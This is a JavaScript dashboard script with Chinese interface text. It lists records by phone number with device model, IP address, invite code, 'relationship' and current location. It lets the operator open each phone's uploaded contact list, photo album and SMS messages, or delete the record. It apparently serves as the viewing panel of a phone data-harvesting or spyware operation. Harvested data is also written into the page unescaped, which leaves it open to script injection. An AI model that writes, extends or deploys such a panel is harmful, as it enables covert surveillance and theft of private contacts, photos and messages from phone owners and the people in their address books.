let currentPage = 1;
let pageSize = parseInt(localStorage.getItem('pageSize')) || 10;
let favorites = JSON.parse(localStorage.getItem('favorites')) || [];

document.getElementById('totalFavorites').textContent = favorites.length;

document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('pageSizeSelect').value = pageSize;
    renderFavorites();
});

function renderFavorites(page = 1) {
    currentPage = page;
    const searchInput = document.getElementById('searchInput').value.toLowerCase();

    // 按时间戳排序，离当前时间越近的越靠前
    const sortedFavorites = favorites.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    const filteredFavorites = sortedFavorites.filter(favorite => 
        favorite.phoneNumber && favorite.phoneNumber.toLowerCase().includes(searchInput)
    );

    const tableBody = document.getElementById('favoritesTable').getElementsByTagName('tbody')[0];
    tableBody.innerHTML = ''; // 确保清空表格内容
    if (filteredFavorites.length === 0) {
        tableBody.innerHTML = '<tr><td colspan="6">没有收藏的数据</td></tr>';
        document.getElementById('totalFavorites').textContent = 0;
        return;
    }

    const start = (currentPage - 1) * pageSize;
    const end = start + pageSize;
    const pageFavorites = filteredFavorites.slice(start, end);

    Promise.all(
        pageFavorites.map(favorite => 
            fetch(`/data?page=1&pageSize=1000`)
                .then(response => response.json())
                .then(data => {
                    return data.data.find(d => d.phoneNumber === favorite.phoneNumber);
                })
                .catch(error => console.error('Error fetching data:', error))
        )
    ).then(results => {
        results.forEach(item => {
            if (item) {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>
                        <div>${formatDate(item.time) || ''}</div>
                        <div>${item.inviteCode || ''}</div>
                    </td>
                    <td>
                        <div>${item.deviceModel || ''}</div>
                        <div>${item.ipAddress || ''}</div>
                    </td>
                    <td>${item.phoneNumber || ''}</td>
                    <td>${item.relationship || ''}</td>
                    <td>${item.currentLocation || ''}</td>
                    <td>
                        <button onclick="showContactDetails('${item.phoneNumber}')">通讯录</button>
                        <button onclick="showAlbum('${item.phoneNumber}')">相册</button>
                        <button onclick="showMessages('${item.phoneNumber}')">短信</button>
                        <button class="favorite-button active" onclick="toggleFavorite('${item.phoneNumber}', this)">已收藏</button>
                        <button onclick="deleteData('${item.phoneNumber}')">删除</button>
                    </td>
                `;
                tableBody.appendChild(row);
            }
        });
    });

    updateFavoritesCount(); // 更新收藏数据总数

    renderPagination(filteredFavorites.length, 'topPagination');
    renderPagination(filteredFavorites.length, 'pagination');
}

function renderPagination(total, elementId) {
    const pagination = document.getElementById(elementId);
    pagination.innerHTML = '';
    const totalPages = Math.ceil(total / pageSize);
    const createPageLink = (pageNum, text, isActive = false) => {
        const link = document.createElement('a');
        link.href = '#';
        link.textContent = text;
        link.className = 'pagination-link';
        if (isActive) {
            link.classList.add('active');
        }
        link.onclick = (event) => {
            event.preventDefault();
            renderFavorites(pageNum);
        };
        return link;
    };

    if (currentPage > 1) {
        pagination.appendChild(createPageLink(currentPage - 1, '«'));
    }

    const startPage = Math.max(1, Math.min(currentPage - 4, totalPages - 9));
    const endPage = Math.min(totalPages, startPage + 9);

    if (startPage > 1) {
        pagination.appendChild(createPageLink(1, '1'));
        if (startPage > 2) {
            const ellipsis = document.createElement('span');
            ellipsis.textContent = '...';
            ellipsis.className = 'pagination-ellipsis';
            pagination.appendChild(ellipsis);
        }
    }

    for (let i = startPage; i <= endPage; i++) {
        pagination.appendChild(createPageLink(i, i, i === currentPage));
    }

    if (endPage < totalPages) {
        if (endPage < totalPages - 1) {
            const ellipsis = document.createElement('span');
            ellipsis.textContent = '...';
            ellipsis.className = 'pagination-ellipsis';
            pagination.appendChild(ellipsis);
        }
        pagination.appendChild(createPageLink(totalPages, totalPages));
    }

    if (currentPage < totalPages) {
        pagination.appendChild(createPageLink(currentPage + 1, '»'));
    }
}

function searchFavorites() {
    currentPage = 1;
    renderFavorites();
}

function changePageSize() {
    pageSize = parseInt(document.getElementById('pageSizeSelect').value, 10);
    localStorage.setItem('pageSize', pageSize);
    currentPage = 1;
    renderFavorites();
}

function formatDate(dateString) {
    const date = new Date(dateString);
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

function showContactDetails(phoneNumber) {
    fetch(`/public/uploads/${phoneNumber}/contacts/contacts.json`)
        .then(response => response.json())
        .then(contacts => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>通讯录详情</h2>
                    <ul>
                        ${contacts.map(contact => `<li>${contact.name}: ${contact.phoneNumber}</li>`).join('')}
                    </ul>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching contact details:', error));
}

function showAlbum(phoneNumber) {
    fetch(`/getPhotos?phoneNumber=${phoneNumber}`)
        .then(response => response.json())
        .then(data => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>相册详情</h2>
                    <div class="album-photos">
                        ${data.photos.map(photo => `<img src="${photo}" alt="Photo" onclick="enlargePhoto('${photo}')">`).join('')}
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching album details:', error));
}

function showMessages(phoneNumber) {
    fetch(`/getMessages?phoneNumber=${phoneNumber}`)
        .then(response => response.json())
        .then(data => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>短信详情</h2>
                    <ul>
                        ${data.messages.map(message => `<li><strong>${message.date} - ${message.address}:</strong> ${message.body}</li>`).join('')}
                    </ul>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching messages:', error));
}

function toggleFavorite(phoneNumber, button) {
    const now = new Date().toISOString();
    const existingFavorite = favorites.find(fav => fav.phoneNumber === phoneNumber);

    if (existingFavorite) {
        favorites = favorites.filter(fav => fav.phoneNumber !== phoneNumber);
        button.textContent = '收藏';
        button.classList.remove('favorite-button', 'active');
    } else {
        favorites.push({ phoneNumber, timestamp: now });
        button.textContent = '已收藏';
        button.classList.add('favorite-button', 'active');
    }
    localStorage.setItem('favorites', JSON.stringify(favorites));
    renderFavorites(currentPage);
    updateFavoritesCount(); // 更新收藏数据总数
}

function deleteData(phoneNumber) {
    if (confirm("确定要删除此数据吗？")) {
        fetch(`/deleteData?phoneNumber=${phoneNumber}`, {
            method: 'DELETE',
        })
        .then(response => {
            if (response.ok) {
                favorites = favorites.filter(fav => fav.phoneNumber !== phoneNumber); // 删除收藏夹中的数据
                localStorage.setItem('favorites', JSON.stringify(favorites)); // 更新localStorage
                renderFavorites(currentPage);
                updateFavoritesCount(); // 更新收藏数据总数
            } else {
                alert('删除失败');
            }
        })
        .catch(error => console.error('Error deleting data:', error));
    }
}

function closeModal() {
    const modal = document.querySelector('.modal');
    if (modal) {
        modal.style.display = "none";
        modal.remove(); // 移除模态框
    }
}

function enlargePhoto(src) {
    const modalPhoto = document.createElement('div');
    modalPhoto.classList.add('modal-photo');
    modalPhoto.innerHTML = `
        <div class="modal-photo-content">
            <span class="close-photo" onclick="closePhotoModal()">&times;</span>
            <img src="${src}" alt="Enlarged Photo">
        </div>
    `;
    document.body.appendChild(modalPhoto);
    modalPhoto.style.display = "block"; // 显示模态框
}

function closePhotoModal() {
    const modalPhoto = document.querySelector('.modal-photo');
    if (modalPhoto) {
        modalPhoto.style.display = "none";
        modalPhoto.remove(); // 移除模态框
    }
}
